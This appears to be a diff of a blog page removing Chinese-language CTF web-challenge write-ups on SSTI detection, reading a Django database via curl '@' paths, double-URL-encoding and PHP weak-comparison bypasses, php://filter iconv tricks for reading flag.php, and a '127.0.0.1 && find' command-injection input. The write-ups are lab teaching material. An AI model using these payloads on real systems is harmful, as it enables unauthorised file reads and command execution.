-<p>框架：在Web开发中，框架和模板通常一起使用。框架提供了应用程序的整体结构和逻辑，包括路由、控制器和数据模型等。模板则负责将数据渲染成HTML或其他格式的用户界面，以便呈现给终端用户。框架通常提供一种将数据传递给模板的机制。</p>
-<h4 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig(PHP)"></a>Twig(PHP)</h4><p>Twig是一个用于PHP的流行的模板引擎</p>
-<h4 id="Flask框架"><a href="#Flask框架" class="headerlink" title="Flask框架"></a>Flask框架</h4><p>渲染方法有两种 : <code>render_template()</code> 和 <code>render_template_string()</code></p>
-<p><code>ender_template()</code> 函数，渲染一个指定的文件 , 这个指定的文件其实就是模板</p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231612877.png" alt="image-20230927231612877"></p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231620453.png" alt="image-20230927231620453"></p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231649505.png" alt="image-20230927231649505"></p>
-<p><code>render_template_string()</code> 函数渲染一个字符串</p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231655444.png" alt="image-20230927231655444"></p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927231701528.png" alt="image-20230927231701528"></p>
-<p><code>render_template_string()</code>函数-&gt;ssti</p>
-<h4 id="ssti简单例子"><a href="#ssti简单例子" class="headerlink" title="ssti简单例子"></a>ssti简单例子</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    html = <span class="string">&#x27;&#123;&#123;12*12&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html)</span><br></pre></td></tr></table></figure>
-
-<p>在flask框架中，模板引擎Jinja2会将<code>&#123;&#123; --- &#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行（flask+Jinja2是比较常用的组合）</p>
-<h4 id="引擎判断"><a href="#引擎判断" class="headerlink" title="引擎判断"></a>引擎判断</h4><p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927232317680.png" alt="image-20230927232317680"></p>
-<p>绿色为执行成功，红色为执行失败，<code>&#123;&#123;7*'7'&#125;&#125;</code>在Twig中返回<code>49</code>，在Jinja2中返回<code>77777777</code></p>
-<h4 id="框架和模板概念区分"><a href="#框架和模板概念区分" class="headerlink" title="框架和模板概念区分"></a>框架和模板概念区分</h4><p>许多框架采用了MVC设计模式作为其架构的一部分，mvc是一种设计模型，而框架是以mvc为设计架构一部分的实体，Flask框架本身不是一个严格的MVC（Model-View-Controller）框架，但它提供了足够的灵活性，可以根据开发人员的需要实现MVC结构或其他类似的设计模式。</p>
-<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>抓包加入字典判断猜测</p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929163500908.png" alt="image-20230929163500908"></p>
-<p>传%80，根据报错信息，网页中出现大量Django，说明是Django框架，匹配报错信息中database关键字</p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929171119595.png" alt="image-20230929171119595"></p>
-<p>根据database的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>
-
-<p>页面搜索ctf，找到flag</p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929171327069.png"></p>
-<p><code>?url=@/opt/api/api/settings.py</code>也可以访问配置文件settings.py，但是其实在上面的报错信息中就可以找到database的路径。另外，上面的报错信息是html代码，所以可以复制代码，打开为网页查看</p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929174327555.png" alt="image-20230929174327555"></p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929174353265.png" alt="image-20230929174353265"></p>
-<p>这里就可以直观的看到setting中的database信息</p>
-<p>附录：</p>
-<p><code>url编码</code>：当 URL 路径或者查询参数中，带有中文或者特殊字符的时候，需要对 URL 进行编码。URL 之所以需要编码，是因为 URL 中的某些字符会引起歧义，比如 URL 查询参数中包含了”&amp;”或者”%”就会造成服务器解析错误。需要注意的是url编码采用的是十六进制，参照ascii码，比如？编码后是<code>%3F-&gt;63-&gt;?</code></p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230929170444274.png" alt="image-20230929170444274"></p>
-<p>从1-127，因为%80的16进制解码后是128，超出了ascii的表示范围，所以会报错，%df,%a0同理</p>
-<p><code>curl参数上传</code>:在PHP中使用CURL进行文件上传时，@符号加上文件路径,CURL将自动读取该文件内容并将其作为请求参数,即使输入的文件路径有错或不存在，CURL仍然可以正常上传。</p>
-<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>查看index.phps,相当于是index.php的备份吧</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;			</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
-
-<p>在url链接里直接运行，浏览器会进行一次url解码，所以要传入二次编码，就把a编码，由于a是在ascii表中，所以编码后依然是a，但我们知道a的ascii是97，所以%61解码后是a，直接再次编码，%2561</p>
-<p>payload:<code>?id=%2561dmin</code></p>
-<h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
-
-<p>admin是字符串，开头不是数字，所以和0弱相等，经过测试admin在if条件判断中为真，所以if($a&#x3D;&#x3D;0 and $a)为真，b&#x3D;1235c，不是纯数字，开头数字大于1234即可</p>
-<h2 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h2><p><img src="/img/image-20231010145235176.png" alt="image-20231010145235176"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a[]=&#x27;flag.php&#x27;;   </span><br><span class="line"></span><br><span class="line">$a=array(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">$a=[&#x27;flag.php&#x27;];</span><br></pre></td></tr></table></figure>
-
-<p>这里嵌套，使用第三种形式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2033a&quot;,&quot;n&quot;:array(array(1,0),0)&#125; </span><br></pre></td></tr></table></figure>
-
-<p>如果是<code>c=&#123;&quot;m&quot;:&quot;2033%00&quot;,&quot;n&quot;:[[0,2],0]&#125;</code>,就需要url编码，最好都编码一下</p>
-<h2 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h2><p><img src="/img/image-20231010150216244.png" alt="image-20231010150216244"></p>
-<p>include一个check.php，说明一定有过滤，常规<code>php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="/img/image-20231010150320739.png" alt="image-20231010150320739"></p>
-<p>尝试给filename传read、base64，encode被过滤，知道了过滤点，flag没有过滤<br>绕过：convert.过滤器支持convert.iconv.格式<br>使用方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br><span class="line">或</span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/convert.iconv.UTF-<span class="number">8</span>*.UCS-4LE*/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<p>php支持的编码格式(部分)：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS</span><br><span class="line">CP932</span><br><span class="line">CP51932</span><br><span class="line">SJIS-mac（别名：MacJapanese）</span><br><span class="line">SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）</span><br><span class="line">SJIS-Mobile#KDDI（别名：SJIS-KDDI）</span><br><span class="line">SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）</span><br><span class="line">UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）</span><br><span class="line">UTF-8-Mobile#KDDI-A</span><br><span class="line">UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）</span><br><span class="line">UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）</span><br><span class="line">ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）</span><br></pre></td></tr></table></figure>
-
-<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><img src="/img/image-20231010153053389.png" alt="image-20231010153053389"></p>
-<p>想上传.php后缀发现弹窗</p>
-<p><img src="/img/image-20231010153126518.png" alt="image-20231010153126518"></p>
-<p>上传键被禁</p>
-<p><img src="/img/image-20231010153212033.png" alt="image-20231010153212033"></p>
-<p>删了这个disable，直接上传即可</p>
-<p><code>127.0.0.1 &amp;&amp; find / -name &quot;flag*&quot; </code>找不到flag的时候可以直接搜</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
   </nav>
 
 
@@ -2082,7 +2008,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
